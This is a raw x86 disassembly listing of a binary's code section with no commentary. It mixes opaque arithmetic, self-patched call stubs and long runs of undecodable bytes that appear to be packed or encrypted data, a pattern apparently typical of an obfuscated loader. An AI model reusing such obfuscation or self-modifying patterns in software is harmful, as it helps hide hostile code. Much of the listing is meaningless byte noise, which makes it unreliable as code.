  410223:	ror    BYTE PTR [edi],0x85
  410226:	xor    eax,0x8b000004
  41022b:	dec    ebp
  41022c:	mov    BYTE PTR [ebx],dh
  41022e:	sar    BYTE PTR [eax+0x209c],cl
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422568
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422568
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422670
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422668],eax
  4102bc:	inc    DWORD PTR ds:0x422670
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41030d:	out    dx,eax
  41030e:	jge    0x4102c0
  410310:	ret    
  410311:	xchg   edx,eax
  410312:	sbb    BYTE PTR [eax],bl
  410314:	mov    esi,0x91181814
  410319:	test   BYTE PTR [ecx+0x1fa7552f],ah
  41031f:	push   esp
  410320:	mov    bl,0xb7
  410322:	lea    eax,ds:0x18fcea1d
  410328:	pop    ebp
  410329:	test   eax,0x418232b1
  41032e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41032f:	mov    ds:0xf7f401d3,al
  410334:	inc    ebp
  410335:	mov    ds:0x527dbb91,al
  41033a:	mov    esp,0xaed63283
  41033f:	lock xchg edi,eax
  410341:	aas    
  410342:	xchg   ecx,eax
  410343:	jl     0x41034b
  410345:	push   esp
  410346:	sti    
  410347:	add    DWORD PTR [ebx+eiz*8-0x79],eax
  41034b:	push   0xc66184ba
  410350:	fdiv   QWORD PTR [ebp-0x431c79b2]
  410356:	mov    ?,edx
  410358:	push   cs
  410359:	fsub   st(6),st
  41035b:	xchg   esi,eax
  41035c:	fbstp  TBYTE PTR [edx+0x75b49693]
  410362:	xchg   esp,eax
  410363:	cmp    edx,esp
  410365:	(bad)  
  410366:	jmp    0x4103db
  410368:	test   al,0xc4
  41036a:	jle    0x410324
  41036c:	xchg   DWORD PTR [eax],edx
  41036e:	pop    ebp
  41036f:	ja     0x4103ab
  410371:	push   0x9f12d455
  410376:	xor    eax,0xa8e724b2
  41037b:	ficomp DWORD PTR [ebx]
  41037d:	into   
  41037e:	ja     0x4103cc
  410380:	xor    eax,0xe51fe959
  410385:	mov    al,ds:0xbbe5abd0
  41038a:	and    BYTE PTR [ebp-0x52],dh
  41038d:	ror    BYTE PTR [edi+esi*4+0x60d75fea],cl
  410394:	mov    ecx,0x1fe56888
  410399:	aas    
  41039a:	test   BYTE PTR [eax-0x4de9f52],0x50
  4103a1:	xchg   edx,eax
  4103a2:	mov    esp,0x88700c76
  4103a7:	daa    
  4103a8:	in     al,0xe9
  4103aa:	ret    
  4103ab:	aam    0xc4
  4103ad:	xchg   BYTE PTR [ecx-0x9e8ef3a],cl
  4103b3:	adc    DWORD PTR [ebp-0x5fe7b026],0xffffffeb
  4103ba:	or     ebx,DWORD PTR [edi+ebp*8-0x273e5ea6]
  4103c1:	add    bh,BYTE PTR [eax]
  4103c3:	repnz fimul WORD PTR [ebp+0x5f]
  4103c7:	es cdq 
  4103c9:	add    eax,0xc7d6ee0d
  4103ce:	and    al,0x35
  4103d0:	cli    
  4103d1:	mov    ah,0x4
  4103d3:	jbe    0x4103a0
  4103d5:	loope  0x410397
  4103d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103d8:	sub    bl,BYTE PTR [ecx-0x4d]
  4103db:	jo     0x41036a
  4103dd:	adc    eax,0xa4701600
  4103e2:	cld    
  4103e3:	(bad)  
  4103e4:	jmp    0x3e75768b
  4103e9:	out    dx,al
  4103ea:	imul   bh
  4103ec:	(bad)  
  4103ed:	dec    ecx
  4103ee:	mov    eax,ds:0x1e1e8ba
  4103f3:	mov    eax,ds:0x9f1c8808
  4103f8:	pop    eax
  4103f9:	push   edi
  4103fa:	test   edi,ecx
  4103fc:	ja     0x410400
  4103fe:	xchg   esi,eax
  4103ff:	xchg   edi,eax
  410400:	dec    ebx
  410401:	inc    ecx
  410402:	(bad)  
  410403:	push   ss
  410404:	sub    al,0xb7
  410406:	fsub   DWORD PTR [eax+ecx*4-0x73]
  41040a:	mov    ah,0x1c
  41040c:	mov    ebp,0xf2b98a49
  410411:	pusha  
  410412:	jno    0x41046b
  410414:	push   es
  410415:	mov    eax,ds:0xc2d3ae81
  41041a:	dec    ecx
  41041b:	jns    0x4103b1
  41041d:	loop   0x4103fb
  41041f:	sbb    DWORD PTR [ecx-0x42ff6289],eax
  410425:	and    DWORD PTR [esp+edx*4+0x7c884793],ebx
  41042c:	mov    eax,ds:0x6fe69f7e
  410431:	or     DWORD PTR [ebp-0x8e269b1],esp
  410437:	jns    0x4103f1
  410439:	iret   
  41043a:	xor    eax,0xf4b47d4e
  41043f:	inc    ebp
  410440:	jmp    0x410436
  410442:	mov    eax,0x5cb08072
  410447:	push   ebx
  410448:	xchg   esp,eax
  410449:	icebp  
  41044a:	add    eax,0xf8859c71
  41044f:	and    bl,BYTE PTR [eax+0x6c]
  410452:	jae    0x4104be
  410454:	mov    edx,0x7b6e85d
  410459:	push   ss
  41045a:	pop    ebx
  41045b:	clc    
  41045c:	cmp    DWORD PTR [edx-0x56051474],ecx
  410462:	pop    ebx
  410463:	or     dh,dh
  410465:	cmp    BYTE PTR [ebx-0x36],0xc
  410469:	inc    esi
  41046a:	retf   0x2373
  41046d:	or     DWORD PTR [edi-0x3a],ecx
  410470:	jle    0x4104e0
  410472:	into   
  410473:	xchg   ebp,eax
  410474:	push   ss
  410475:	out    0x2c,al
  410477:	jge    0x4104ba
  410479:	inc    ebx
  41047a:	clc    
  41047b:	ficomp DWORD PTR [esi+0x15ff5ad5]
  410481:	inc    ecx
  410482:	mov    eax,0xf4f4674a
  410487:	stos   DWORD PTR es:[edi],eax
  410488:	inc    edi
  410489:	mov    eax,0x4e5be56f
  41048e:	cmp    DWORD PTR [esi+0x51],edx
  410491:	cmp    al,0x6b
  410493:	mov    ds:0x9bc57878,al
  410498:	jle    0x4104bd
  41049a:	addr16 mov cl,0x31
  41049d:	dec    edx
  41049e:	jmp    0xe8aa4227
  4104a3:	push   edx
  4104a4:	pusha  
  4104a5:	pop    ds
  4104a6:	mov    cl,0x64
  4104a8:	fsub   DWORD PTR [eax+0x7151366e]
  4104ae:	push   ds
  4104af:	mov    ch,BYTE PTR [ebx]
  4104b1:	inc    esp
  4104b2:	lahf   
  4104b3:	push   eax
  4104b4:	adc    ebp,DWORD PTR [ecx+0x4c5b2b1b]
  4104ba:	mov    ds:0xef2bfca,al
  4104bf:	ret    0x5ce1
  4104c2:	jns    0x41044a
  4104c4:	stc    
  4104c5:	or     eax,0x6ce8209c
  4104ca:	mov    dl,0xba
  4104cc:	test   al,0xb2
  4104ce:	stos   DWORD PTR es:[edi],eax
  4104cf:	push   esi
  4104d0:	cs push 0x6153b4b8
  4104d6:	jns    0x41053b
  4104d8:	(bad)  
  4104d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104da:	aaa    
  4104db:	sub    BYTE PTR [esi-0x69],0xf2
  4104df:	dec    ecx
  4104e0:	daa    
  4104e1:	mov    ds:0x1b006f7,eax
  4104e6:	push   ebx
  4104e7:	daa    
  4104e8:	xchg   esi,eax
  4104e9:	or     al,0x48
  4104eb:	loopne 0x410536
  4104ed:	jno    0x4104e6
  4104ef:	sub    eax,0x69b86074
  4104f4:	gs pop ecx
  4104f6:	loope  0x410499
  4104f8:	xchg   edi,eax
  4104f9:	test   DWORD PTR [eax-0x1a],esi
  4104fc:	jle    0x41052f
  4104fe:	cli    
  4104ff:	bnd jp 0x410484
  410502:	es sti 
  410504:	bnd ret 0x995a
  410508:	lods   al,BYTE PTR es:[esi]
  41050a:	or     DWORD PTR [edx],0x57
  41050d:	lock shl DWORD PTR [eax-0x17],1
  410511:	push   ss
  410512:	add    DWORD PTR ds:0x673f1169,eax
  410518:	test   eax,0x6eb3b819
  41051d:	pop    ecx
  41051e:	loop   0x410553
  410520:	jl     0x410593
  410522:	clc    
  410523:	pop    ss
  410524:	rcr    DWORD PTR [eax],1
  410526:	outs   dx,DWORD PTR ds:[esi]
  410527:	cmp    esi,DWORD PTR [ebp+ebx*1-0x2eb7399]
  41052e:	repnz mov ecx,0x73a05fca
  410534:	mov    al,ds:0x23f92b1a
  410539:	les    eax,FWORD PTR [edx]
  41053b:	jmp    0x410525
  41053d:	sub    eax,0x3410596
  410542:	mov    al,0xff
  410544:	lods   al,BYTE PTR ds:[esi]
  410545:	stos   DWORD PTR es:[edi],eax
  410546:	jp     0x410590
  410548:	std    
  410549:	jmp    0x4105c7
  41054b:	test   BYTE PTR [eax],0x83
  41054e:	aad    0xb2
  410550:	xor    DWORD PTR [edi+esi*8-0x10f4d61c],0x953ca639
  41055b:	pop    DWORD PTR [edx+0x44f0f826]
  410561:	out    dx,al
  410562:	in     al,0xf0
  410564:	xchg   BYTE PTR [eax-0x1],dl
  410567:	cwde   
  410568:	arpl   WORD PTR [ecx],ax
  41056a:	outs   dx,BYTE PTR ds:[esi]
  41056b:	sar    BYTE PTR [eax-0x72ffbeaf],cl
  410571:	loopne 0x4105d5
  410573:	cwde   
  410574:	mov    ebp,0xc8e8107d
  410579:	sbb    esi,DWORD PTR [ecx-0x46f3cb87]
  41057f:	cmp    ah,dl
  410581:	jmp    0x41051c
  410583:	scas   al,BYTE PTR es:[edi]
  410584:	xor    eax,0xd1f77402
  410589:	in     al,dx
  41058a:	(bad)  
  41058b:	in     al,dx
  41058c:	(bad)  
  41058e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058f:	adc    ebp,edx
  410591:	and    al,0x95
  410593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410594:	cmp    DWORD PTR [ebp+0x504e8c48],ebx
  41059a:	pop    ebp
  41059b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41059c:	fnop   
  41059e:	sub    al,0x51
  4105a0:	adc    ecx,DWORD PTR [edi+0x31ee76eb]
  4105a6:	lahf   
  4105a7:	pop    esi
  4105a8:	mov    ss,WORD PTR [eax-0x70]
  4105ab:	jo     0x410530
  4105ad:	enter  0x38d3,0xec
  4105b1:	push   cs
  4105b2:	call   DWORD PTR [bp+si+0x20e6]
  4105b7:	sbb    DWORD PTR [ecx+0x17],eax
  4105ba:	and    DWORD PTR [eax],esi
  4105bc:	shl    edi,cl
  4105be:	dec    edx
  4105bf:	xor    ecx,DWORD PTR [eax+0x6d]
  4105c2:	mov    bh,0x62
  4105c4:	add    DWORD PTR [ecx],esi
  4105c6:	sti    
  4105c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105c8:	int    0x8d
  4105ca:	inc    ebp
  4105cb:	lock mov DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x4223e4
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422658
  410612:	push   DWORD PTR ds:0x4223ec
  410618:	push   DWORD PTR ds:0x422638
  41061e:	push   DWORD PTR ds:0x4226ac
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422568
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	xor    al,0x4b
  4106ee:	sbb    edi,DWORD PTR [esi+0x68]
  4106f1:	mov    ds,WORD PTR [eax]
  4106f3:	sbb    BYTE PTR [edx+0x4f181814],bl
  4106f9:	push   ss
  4106fa:	and    dh,bh
  4106fc:	jne    0x41077d
  4106fe:	iret   
  4106ff:	aas    
  410700:	or     ebx,esi
  410702:	mov    ch,0x11
  410704:	mov    edi,0x43406f6
  410709:	ss (bad) 
  41070c:	imul   ebp,esi,0xe68db2dc
  410712:	jo     0x4106e3
  410714:	psllq  mm1,mm7
  410717:	inc    eax
  410718:	rol    DWORD PTR [eax+edi*4-0x34],0x2
  41071d:	push   ss
  41071e:	mov    eax,ds:0x1b0bc365
  410723:	or     eax,0x5df08d21
  410728:	out    0xbf,al
  41072a:	cmp    BYTE PTR [eax],al
  41072c:	jg     0x410725
  41072e:	fdivr  DWORD PTR [esi+0x51]
  410731:	jb     0x41079a
  410733:	cdq    
  410734:	inc    esp
  410735:	lea    esp,es:[ebx-0x32fececc]
  41073c:	jg     0x410737
  41073e:	sub    ebx,DWORD PTR [ebp+0x6efec3a9]
  410744:	mov    ch,0xc8
  410746:	dec    esp
  410747:	xor    edx,DWORD PTR [edi+0x49]
  41074a:	mov    edi,0xbb92d35e
  41074f:	stos   BYTE PTR es:[edi],al
  410750:	xlat   BYTE PTR gs:[ebx]
  410752:	leave  
  410753:	mov    al,0x94
  410755:	push   es
  410756:	std    
  410757:	xchg   BYTE PTR ds:0xd438571f,ah
  41075d:	jno    0x41075e
  41075f:	mov    ds:0x82e8e7eb,al
  410764:	jb     0x410705
  410766:	sub    dl,ah
  410768:	loope  0x4107cb
  41076a:	pop    edx
  41076b:	pusha  
  41076c:	leave  
  41076d:	sbb    al,0x44
  41076f:	stos   DWORD PTR es:[edi],eax
  410770:	mov    esp,0x15c390c4
  410775:	jl     0x410787
  410777:	adc    BYTE PTR ds:0xe1fcd816,al
  41077d:	cmp    dl,BYTE PTR gs:[ebp+0x7d]
  410781:	outs   dx,BYTE PTR ds:[esi]
  410782:	mov    edx,0x8a480220
  410787:	mov    ah,BYTE PTR [esi-0x60]
  41078a:	or     BYTE PTR [edi+0x3],ch
  41078d:	adc    eax,0xf702cd80
  410792:	sub    bh,dh
  410794:	and    dl,bl
  410796:	loop   0x410788
  410798:	mov    esp,ebp
  41079a:	call   0x626a:0xd6d1fa24
  4107a1:	mov    ebx,0xac0ceb9f
  4107a6:	int    0xeb
  4107a8:	mov    ?,edx
  4107aa:	loop   0x410775
  4107ac:	ret    
  4107ad:	xor    eax,0xc0b16f29
  4107b2:	inc    ebx
  4107b3:	mov    al,ds:0x461d53d3
  4107b8:	cmp    al,0x61
  4107ba:	(bad)  
  4107bb:	test   BYTE PTR [ecx-0x4e5f4c91],0xaf
  4107c2:	lea    ebp,[ebp+0x31070e09]
  4107c8:	mov    eax,edi
  4107ca:	jbe    0x41076f
  4107cc:	ror    BYTE PTR [eax+0x2642bca7],cl
  4107d2:	jb     0x4107fd
  4107d4:	xor    dh,BYTE PTR [eax+eiz*1]
  4107d7:	rcl    ebx,1
  4107d9:	and    eax,0x1386488b
  4107de:	cmp    DWORD PTR [esi],0xffffff94
  4107e1:	jno    0x4107bc
  4107e3:	retf   0xe15c
  4107e6:	imul   ebx,DWORD PTR [eax+0x9e47e2d],0xe407990e
  4107f0:	ss dec edx
  4107f2:	sbb    ah,BYTE PTR [edx+0x29]
  4107f5:	jae    0x410867
  4107f7:	lods   al,BYTE PTR ds:[esi]
  4107f8:	pusha  
  4107f9:	or     edx,DWORD PTR [ebx+0x63]
  4107fc:	jns    0x4107a1
  4107fe:	loope  0x41086b
  410800:	ror    edi,1
  410802:	jno    0x41079b
  410804:	out    dx,eax
  410805:	add    al,0xe4
  410807:	sti    
  410808:	retf   0x5b89
  41080b:	in     al,dx
  41080c:	stos   BYTE PTR es:[edi],al
  41080d:	cmp    eax,0xf7731bf
  410812:	dec    esi
  410813:	int    0x6a
  410815:	mov    bl,0xba
  410817:	test   BYTE PTR [eax+0x7d6fcb41],0x23
  41081e:	jns    0x4107da
  410820:	dec    ebp
  410821:	adc    bh,BYTE PTR [ecx+0x7f]
  410824:	jae    0x41080b
  410826:	jae    0x41080b
  410828:	add    eax,0xaa835ed0
  41082d:	adc    eax,0x479567e
  410832:	nop
  410833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410834:	xchg   ecx,eax
  410835:	inc    edi
  410836:	inc    eax
  410837:	imul   ebx,DWORD PTR [edx-0x9],0x24233ab5
  41083e:	ins    BYTE PTR es:[edi],dx
  41083f:	sub    bl,bl
  410841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410842:	sahf   
  410843:	xor    DWORD PTR [esi-0x2e],edi
  410846:	popf   
  410847:	xor    edx,DWORD PTR [edx+0x3d]
  41084a:	cld    
  41084b:	test   BYTE PTR [ebx+0x4a],bl
  41084e:	xor    eax,0x1ec45ad7
  410853:	cs daa 
  410855:	sahf   
  410856:	in     eax,0xa8
  410858:	lds    esp,FWORD PTR [edx]
  41085a:	(bad)  
  41085b:	jmp    0x410894
  41085d:	idiv   ebx
  41085f:	inc    eax
  410860:	ror    DWORD PTR [edx+0x4bd28916],cl
  410866:	(bad)  
  410868:	xchg   ebx,eax
  410869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41086a:	(bad)  
  41086b:	loop   0x4108b5
  41086d:	aam    0xdd
  41086f:	mov    esi,0x2b18122e
  410874:	in     eax,0x7d
  410876:	ret    0xa749
  410879:	ins    BYTE PTR es:[edi],dx
  41087a:	push   0xffffffe8
  41087c:	sbb    eax,0xbb0562c0
  410881:	je     0x41085d
  410883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410884:	xor    edi,esp
  410886:	cmp    edi,ebp
  410888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410889:	nop
  41088a:	pop    ebp
  41088b:	(bad)  
  41088c:	shl    DWORD PTR [ebp-0x5ac68273],0xa7
  410893:	inc    eax
  410894:	jecxz  0x4108fb
  410896:	aam    0xdb
  410898:	stos   DWORD PTR es:[edi],eax
  410899:	xor    esp,DWORD PTR [ebx-0x68fb63d0]
  41089f:	fwait
  4108a0:	xor    bl,BYTE PTR [bp+si+0xf7e]
  4108a5:	int3   
  4108a6:	push   0xa1fbe305
  4108ab:	sbb    ch,BYTE PTR [edi]
  4108ad:	aas    
  4108ae:	mov    ds:0x57f42544,al
  4108b3:	jb     0x410898
  4108b5:	outs   dx,DWORD PTR ds:[esi]
  4108b6:	loope  0x41086c
  4108b8:	iret   
  4108b9:	xlat   BYTE PTR ds:[ebx]
  4108ba:	adc    al,0x44
  4108bc:	je     0x4108c5
  4108be:	inc    ecx
  4108bf:	loop   0x41093b
  4108c1:	jg     0x4108f1
  4108c3:	stos   BYTE PTR es:[edi],al
  4108c4:	sbb    DWORD PTR [esi+0x2e2c6c09],ebx
  4108ca:	sbb    al,0x11
  4108cc:	les    edi,FWORD PTR [ebx+0xa4b79cb]
  4108d2:	xor    eax,0x7bba25e9
  4108d7:	mov    ecx,0xac2f8fcc
  4108dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108dd:	mov    esi,0xc674353f
  4108e2:	test   eax,0xa14b7bef
  4108e7:	(bad)  
  4108e8:	(bad)  
  4108e9:	dec    ecx
  4108ea:	fild   QWORD PTR [eax+0x17c79f34]
  4108f0:	(bad)  
  4108f1:	(bad)  [ebp-0x2e074458]
  4108f7:	xor    esp,DWORD PTR [esi-0x77]
  4108fa:	sub    cl,BYTE PTR [edi-0x27]
  4108fd:	out    dx,eax
  4108fe:	xchg   DWORD PTR [ebx-0x52],esp
  410901:	dec    ecx
  410902:	icebp  
  410903:	mov    ebp,0x1a178f8c
  410908:	adc    BYTE PTR [ebp-0x2e38ddaf],cl
  41090e:	shl    bl,1
  410910:	pop    edx
  410911:	fcmovnb st,st(1)
  410913:	test   BYTE PTR [ebp+0x31bd7ed2],ah
  410919:	xchg   edi,eax
  41091a:	or     BYTE PTR [ecx-0x5fc3cc20],dl
  410920:	sbb    ah,BYTE PTR [edi]
  410922:	xchg   esi,eax
  410923:	scas   al,BYTE PTR es:[edi]
  410924:	rcr    bl,1
  410926:	sbb    al,bh
  410928:	sbb    edx,esi
  41092a:	sbb    eax,0xd070175b
  41092f:	add    eax,0xf4cf49be
  410934:	popf   
  410935:	pop    ebp
  410936:	test   dl,ch
  410938:	jo     0x410909
  41093a:	or     eax,0xfc7e8810
  41093f:	mov    ss,WORD PTR [eax-0x7a8befcc]
  410945:	mov    al,ds:0xbb78d8bc
  41094a:	cmp    eax,0x42fc3da8
  41094f:	shl    DWORD PTR [edx+0x32],cl
  410952:	xor    dl,BYTE PTR [ebx]
  410954:	daa    
  410955:	loopne 0x410978
  410957:	pop    esp
  410958:	or     al,0x93
  41095a:	(bad)  
  41095b:	test   DWORD PTR [edi],0xbb9c1ee7
  410961:	das    
  410962:	test   edi,edx
  410964:	(bad)  
  410965:	in     al,0x94
  410967:	popa   
  410968:	outs   dx,DWORD PTR ds:[esi]
  410969:	jmp    0x27a58ba9
  41096e:	(bad)  
  41096f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410971:	(bad)  
  410972:	pop    ds
  410973:	(bad)  
  410974:	mov    al,0x5b
  410976:	jns    0x4109e4
  410978:	daa    
  410979:	in     eax,0x8a
  41097b:	iret   
  41097c:	dec    ebp
  41097d:	lock sbb ah,BYTE PTR ds:0xfc25e463
  410984:	dec    eax
  410985:	dec    esp
  410986:	sahf   
  410987:	jmp    0xe996c5ec
  41098c:	ja     0x410976
  41098e:	loopne 0x4109fa
  410990:	mov    edi,0x1bfa6774
  410995:	push   ds
  410996:	ins    DWORD PTR es:[edi],dx
  410997:	mov    esp,0x24e14b93
  41099c:	in     al,0x24
  41099e:	mov    es,WORD PTR [edi]
  4109a0:	call   0x1744:0x51d18da8
  4109a7:	ja     0x4109d6
  4109a9:	cmp    dl,ch
  4109ab:	jo     0x410968
  4109ad:	adc    bl,0x2d
  4109b0:	adc    bl,ch
  4109b2:	ret    0x9b53
  4109b5:	fadd   QWORD PTR [edx]
  4109b7:	push   ebp
  4109b8:	es pop ss
  4109ba:	ror    BYTE PTR ds:0x58c4,1
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x422074
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x422074
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0xbefc1505
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [ecx],dl
  410a7d:	icebp  
  410a7e:	mov    eax,ds:0x88078ff8
  410a83:	sbb    al,0x4d
  410a85:	mov    ch,0x1e
  410a87:	test   eax,0x1245a071
  410a8c:	sub    eax,0x5456147
  410a91:	adc    ebp,ebx
  410a93:	fcmovu st,st(5)
  410a95:	pop    es
  410a96:	jns    0x410a8d
  410a98:	dec    ecx
  410a99:	xchg   esp,eax
  410a9a:	mov    ds:0x345265b2,eax
  410a9f:	imul   edx,DWORD PTR [edx+ebx*4-0x6f562f99],0x7b38ec77
  410aaa:	add    BYTE PTR [eax+0x39],0xaf
  410aae:	fbld   TBYTE PTR [ebx]
  410ab0:	cmc    
  410ab1:	add    dl,BYTE PTR [edi]
  410ab3:	in     eax,dx
  410ab4:	xor    eax,0x37e2dded
  410ab9:	jge    0x410ab1
  410abb:	push   0x595563cc
  410ac0:	xchg   edi,eax
  410ac1:	mov    edi,0xf9b9be9e
  410ac6:	inc    di
  410ac8:	jmp    0xfc09ac68
  410acd:	jo     0x410b0e
  410acf:	jnp    0x410b2f
  410ad1:	into   
  410ad2:	mov    dl,0xc1
  410ad4:	aaa    
  410ad5:	data16 mov ah,BYTE PTR [ecx+0x19667b58]
  410adc:	mov    cl,0x10
